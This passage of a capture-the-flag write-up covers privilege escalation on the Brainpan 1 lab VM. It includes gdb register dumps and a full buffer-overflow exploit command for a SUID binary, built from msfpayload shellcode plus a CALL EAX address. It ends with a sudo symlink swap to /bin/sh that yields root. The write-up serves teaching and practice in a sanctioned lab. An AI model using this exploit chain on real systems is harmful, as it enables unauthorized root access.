+&lt;p&gt;Reviewing the list of SUID binaries, &lt;code&gt;/usr/local/bin/validate&lt;/code&gt; stood out to me as I&amp;rsquo;d never seen it before.  I was able to collect some more information about it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ls -la /usr/local/bin/validate
+-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 /usr/local/bin/validate
+  
+getfacl /usr/local/bin/validate
+getfacl: Removing leading &#39;/&#39; from absolute path names
+# file: usr/local/bin/validate
+# owner: anansi
+# group: anansi
+# flags: s--
+user::rwx
+group::r-x
+other::r-x
+  
+/usr/local/bin/validate
+usage /usr/local/bin/validate &amp;lt;input&amp;gt;
+  
+file /usr/local/bin/validate
+/usr/local/bin/validate: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x01d3b7c4bc6eda9d4b4e9c25e036a36349b9630a, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Hmm, so a suspicious binary with a single user input&amp;hellip;  Brainpan doesn&amp;rsquo;t have strings installed, so I transferred the binary to my Kali machine to analyse.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/1# strings validate
+[...snip...]
+strcpy
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So the user input is again passed using the vulnerable &lt;code&gt;strcpy&lt;/code&gt; function.  If we could exploit this, we would gain access as &lt;code&gt;anansi&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;exploiting-validate:edcb2de0cbbe69c925e398e09c0d9e58&#34;&gt;Exploiting Validate&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/1# ./validate `python -c &#39;print (&amp;quot;A&amp;quot; * 200)&#39;`
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I was able to crash the application, now to load it up in gdb and have a closer look&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/1# gdb -q ./validate
+Reading symbols from /root/brainpan/1/validate...done.
+(gdb) r `python -c &#39;print (&amp;quot;A&amp;quot; * 200)&#39;`
+Starting program: /root/brainpan/1/validate `python -c &#39;print (&amp;quot;A&amp;quot; * 200)&#39;`
+  
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+  
+(gdb) i r
+eax            0xbffff378   -1073745032
+ecx            0x0  0
+edx            0xc9 201
+ebx            0x41414141   1094795585
+esp            0xbffff3f0   0xbffff3f0
+ebp            0x41414141   0x41414141
+esi            0x0  0
+edi            0x0  0
+eip            0x41414141   0x41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;More analysis of the stack showed that I could overwrite into &lt;code&gt;ESP&lt;/code&gt;, but I couldn&amp;rsquo;t find a &lt;code&gt;JMP ESP&lt;/code&gt; instruction within the binary to use as I did earlier.  However I was also overwriting &lt;code&gt;EAX&lt;/code&gt; and there was a &lt;code&gt;CALL EAX&lt;/code&gt; instruction in the binary.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/1# objdump -D validate -M intel | grep eax | grep call
+ 8048468:   ff 14 85 14 9f 04 08    call   DWORD PTR [eax*4+0x8049f14]
+ 80484af:   ff d0                   call   eax
+ 804862b:   ff d0                   call   eax
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I found that the &lt;code&gt;EIP&lt;/code&gt; offset was &lt;code&gt;116 bytes&lt;/code&gt; (using the pattern_create/offset method).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;(gdb) r `python -c &#39;print (&amp;quot;A&amp;quot; * 116) + (&amp;quot;B&amp;quot; * 4)&#39;`
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+  
+(gdb) x/40x $eax -4
+0xbffff3c4: 0x00000001  0x41414141  0x41414141  0x41414141
+0xbffff3d4: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff3e4: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff3f4: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff404: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff414: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff424: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff434: 0x41414141  0x41414141  0x42424242  0xbffff600
+0xbffff444: 0xb7fbeff4  0x080485b0  0xbffff468  0xb7e8e7f5
+0xbffff454: 0xb7ff0590  0x080485bb  0xb7fbeff4  0x080485b0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So if I&amp;rsquo;m going to exploit this, I will probably need to include shellcode at the start of the buffer, then use the &lt;code&gt;CALL EAX&lt;/code&gt; to jump up the stack to it.  It seems &lt;code&gt;EAX&lt;/code&gt; starts at &lt;code&gt;0xbffff3c8&lt;/code&gt; and ends at &lt;code&gt;0xbffff438&lt;/code&gt;; which is a total of &lt;code&gt;112 bytes&lt;/code&gt; - plenty of space for some decent shellcode.&lt;/p&gt;
+
+&lt;p&gt;I don&amp;rsquo;t need to create anything as cumbersome as full reverse shellcode - since I already have access to the system, all I require is a new instance of bash.  This will inherit the privileges of anansi since the suid binary is executing it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# msfpayload linux/x86/exec CMD=&amp;quot;/bin/sh&amp;quot; R | msfencode -e x86/shikata_ga_nai -b &#39;\x00&#39; -t c
+[*] x86/shikata_ga_nai succeeded with size 70 (iteration=1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So I just pieced this together as: &lt;code&gt;shellcode + padding + call eax&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+  
+/usr/local/bin/validate `python -c &#39;print &amp;quot;\xb8\x83\x64\xca\x02\xdd\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x83\xea\xfc\x31\x42\x11\x03\x42\x11\xe2\x76\x0e\xc1\x5a\xe1\x9d\xb3\x32\x3c\x41\xb5\x24\x56\xaa\xb6\xc2\xa6\xdc\x17\x71\xcf\x72\xe1\x96\x5d\x63\xf9\x58\x61\x73\xd5\x3a\x08\x1d\x06\xc8\xa2\xe1\x0f\x7d\xbb\x03\x62\x01&amp;quot; + (&amp;quot;\x90&amp;quot; * 46) + &amp;quot;\xaf\x84\x04\x08&amp;quot;&#39;`
+  
+id
+uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Excellent.  Now I have access as anansi, I could get into their home directory and check out &lt;code&gt;anansi_util&lt;/code&gt; some more.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cd /home/anansi/bin
+ls -la
+-rwxr-xr-x 1 anansi anansi 7256 Mar  4  2013 anansi_util
+  
+getfacl anansi_util
+# file: anansi_util
+# owner: anansi
+# group: anansi
+user::rwx
+group::r-x
+other::r-x
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So this is a binary which we have full control over (as anansi) and can execute with sudo rights (as puck).  This is actually very trivial to leverage.  I was able to simply move the exisiting binary, and replace it with a symlink to &lt;code&gt;/bin/sh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mv anansi_util anansi_util.bk
+ln -s /bin/sh ./anansi_util
+  
+ls -la
+lrwxrwxrwx 1 anansi puck      7 May 29 12:36 anansi_util -&amp;gt; /bin/sh
+-rwxr-xr-x 1 anansi anansi 7256 Mar  4  2013 anansi_util.bk
+  
+sudo /home/anansi/bin/anansi_util
+id; whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;w00t!
+I couldn&amp;rsquo;t find an obvious final flag, so assume the challenge ends here.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
